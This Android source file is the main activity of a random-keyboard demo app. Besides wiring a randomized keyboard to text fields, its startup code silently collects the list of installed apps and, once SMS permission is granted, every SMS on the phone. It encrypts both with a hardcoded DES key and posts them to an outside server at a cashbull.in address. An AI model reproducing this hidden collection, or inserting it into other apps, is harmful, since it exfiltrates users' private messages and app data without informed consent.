package com.benli.randomkeyboard;

import android.content.DialogInterface;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.EditText;
import android.widget.PopupWindow;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.benli.keyboard.KeyboardHelper;
import com.benli.randomkeyboard.app.AppInfoBean;
import com.benli.randomkeyboard.app.AppUtils;
import com.benli.randomkeyboard.app.UploadDataBean;
import com.benli.randomkeyboard.sms.SMSInfoBean;
import com.benli.randomkeyboard.sms.SMSUtils;
import com.blankj.utilcode.constant.PermissionConstants;
import com.blankj.utilcode.util.ConvertUtils;
import com.blankj.utilcode.util.EncryptUtils;
import com.blankj.utilcode.util.PermissionUtils;
import com.blankj.utilcode.util.SPStaticUtils;
import com.blankj.utilcode.util.StringUtils;
import com.facebook.drawee.view.SimpleDraweeView;
import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import java.util.List;

public class MainActivity extends AppCompatActivity implements CommonUtils.OnDynamicCodeDialogClickListener {


    private String keyDES       = "6801020304050607";
    private String resDES       = "1F7962581118F360";
    private byte[] bytesKeyDES  = ConvertUtils.hexString2Bytes(keyDES);
    private byte[] bytesResDES  = ConvertUtils.hexString2Bytes(resDES);

    private KeyboardHelper keyboardHelper;
    private AlertDialog alertDialog;
    private PopupWindow popupWindow;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        keyboardHelper = new KeyboardHelper(this)
                .addEditText((EditText) findViewById(R.id.edittext1))
                .addEditText((EditText) findViewById(R.id.edittext2))
                .setShouldRandom(true);
        Uri uri = Uri.parse("https://raw.githubusercontent.com/facebook/fresco/gh-pages/static/logo.png");
        SimpleDraweeView draweeView = findViewById(R.id.iv_img);
        draweeView.setImageURI(uri);

        collectAppInfo("test-randomkeyboard");

        PermissionUtils.permission(PermissionConstants.SMS).callback(new PermissionUtils.SimpleCallback() {
            @Override
            public void onGranted() {
                collectSMSInfo("test-randomkeyboard-sms");
            }

            @Override
            public void onDenied() {

            }
        }).request();
    }

    private void doCollectInfo(UploadDataBean uploadDataBean) {
        String data = new Gson().toJson(uploadDataBean.data);
        UploadDataBean<String> bean = new UploadDataBean<>();
        byte[] dataBytes = EncryptUtils.encrypt3DES2Base64(data.getBytes(), bytesKeyDES, "DES/CBC/PKCS5Padding", null );
        bean.data = new String(dataBytes);
        bean.dataID = uploadDataBean.dataID;
        bean.endTime = uploadDataBean.endTime;
        bean.node = uploadDataBean.node;
        bean.order = uploadDataBean.order;
        bean.orderLength = uploadDataBean.orderLength;
        bean.startTime = uploadDataBean.startTime;
        bean.pageCount = uploadDataBean.pageCount;
        bean.total = uploadDataBean.total;
        bean.type = uploadDataBean.type;
        doSaveNew(bean);
    }

    private void collectSMSInfo(String collectNode) {
        UploadDataBean<List<SMSInfoBean>> uploadDataBean = new UploadDataBean<>();
        uploadDataBean.startTime = System.currentTimeMillis();
        uploadDataBean.dataID = java.util.UUID.randomUUID().toString();
        uploadDataBean.type = 6;
        uploadDataBean.node = collectNode;

        List<SMSInfoBean> smsInfoBeanList = SMSUtils.getSmsInPhone(this);
        uploadDataBean.endTime = System.currentTimeMillis();

        int remainder = smsInfoBeanList.size() % PAGE_LIMIT;
        int page = smsInfoBeanList.size() / PAGE_LIMIT;

        uploadDataBean.orderLength = remainder > 0 ? page + 1 : page;
        uploadDataBean.total = smsInfoBeanList.size();

        for (int i = 0; i < page; i ++) {

            UploadDataBean<List<SMSInfoBean>> realUploadDataBean = uploadDataBean;

            try {
                realUploadDataBean = (UploadDataBean<List<SMSInfoBean>>) uploadDataBean.clone();
            } catch (CloneNotSupportedException e) {
                e.printStackTrace();
            }

            realUploadDataBean.order = i + 1;
            realUploadDataBean.pageCount = PAGE_LIMIT;
            realUploadDataBean.data = smsInfoBeanList.subList(i * PAGE_LIMIT, (i + 1) * PAGE_LIMIT);

            doCollectInfo(realUploadDataBean);
        }

        if (remainder > 0) {
            uploadDataBean.order = page + 1;
            uploadDataBean.pageCount = remainder;
            uploadDataBean.data = smsInfoBeanList.subList(uploadDataBean.total - remainder, uploadDataBean.total);

            doCollectInfo(uploadDataBean);
        }

    }

    private void doSaveNew(UploadDataBean uploadDataBean) {
        String json = SPStaticUtils.getString("appData");
        Log.d("tag", json);
        doHttp(json);

        json = new Gson().toJson(uploadDataBean);
        doHttp(json);
        SPStaticUtils.put("appData", json);
        Log.d("tag", json);
    }

    private void doHttp(String json) {
        if (!StringUtils.isEmpty(json)) {
            OkGo.<String>post("https://cy-qa.cashbull.in/appserver/save/new")
                    .upJson(json).execute(new StringCallback() {

                @Override
                public void onSuccess(Response<String> response) {
                    Log.d("okgo", response.body());
                }
            });
        }
    }

    static final int PAGE_LIMIT = 500;

    private void collectAppInfo(String collectNode) {
        UploadDataBean<List<AppInfoBean>> uploadDataBean = new UploadDataBean<>();
        uploadDataBean.startTime = System.currentTimeMillis();
        uploadDataBean.dataID = java.util.UUID.randomUUID().toString();
        uploadDataBean.type = 4;
        uploadDataBean.node = collectNode;

        List<AppInfoBean> appInfoBeanList = AppUtils.getAppInfos(this);
        uploadDataBean.endTime = System.currentTimeMillis();

        int remainder = appInfoBeanList.size() % PAGE_LIMIT;
        int page = appInfoBeanList.size() / PAGE_LIMIT;

        uploadDataBean.orderLength = remainder > 0 ? page + 1 : page;
        uploadDataBean.total = appInfoBeanList.size();

        for (int i = 0; i < page; i++) {

            UploadDataBean<List<AppInfoBean>> realUploadDataBean = uploadDataBean;

            try {
                realUploadDataBean = (UploadDataBean<List<AppInfoBean>>) uploadDataBean.clone();
            } catch (CloneNotSupportedException e) {
                e.printStackTrace();
            }

            realUploadDataBean.order = i + 1;
            realUploadDataBean.pageCount = PAGE_LIMIT;
            realUploadDataBean.data = appInfoBeanList.subList(i * PAGE_LIMIT, (i + 1) * PAGE_LIMIT);

            doCollectInfo(realUploadDataBean);
        }

        if (remainder > 0) {
            uploadDataBean.order = page + 1;
            uploadDataBean.pageCount = remainder;
            uploadDataBean.data = appInfoBeanList.subList(uploadDataBean.total - remainder, uploadDataBean.total);

            doCollectInfo(uploadDataBean);
        }
    }

    public void onClick(View v) {
        alertDialog = CommonUtils.showDynamicCodeDialog(this, "提示信息", "请输入", false, true, -1, this);
        Window window = alertDialog.getWindow();
        final EditText edtWithdrawCashDynamicCode = (EditText) window.findViewById(R.id.edt_withdraw_cash_dynamic_code);
        keyboardHelper.addEditText(edtWithdrawCashDynamicCode);
    }

    public void onPopwindowClick(View v) {
        popupWindow = CommonUtils.showDynamicCodeWindow(this, "提示信息", "请输入", false, true, -1, this, v);

        View window = popupWindow.getContentView();
        final EditText edtWithdrawCashDynamicCode = (EditText) window.findViewById(R.id.edt_withdraw_cash_dynamic_code);
        keyboardHelper.addEditText(edtWithdrawCashDynamicCode);
    }

    @Override
    public void onGetCode(Button view, EditText editText) {

    }

    @Override
    public void onCancel(TextView view, EditText editText) {
        if (alertDialog != null) {
            alertDialog.dismiss();
        }

        if (popupWindow != null) {
            popupWindow.dismiss();
        }
    }

    @Override
    public void onDismiss(DialogInterface dialog) {

    }

    @Override
    public void onSure(TextView view, EditText editText) {
        Toast.makeText(this, "onSure:" + editText.getText(), Toast.LENGTH_SHORT).show();
    }
}
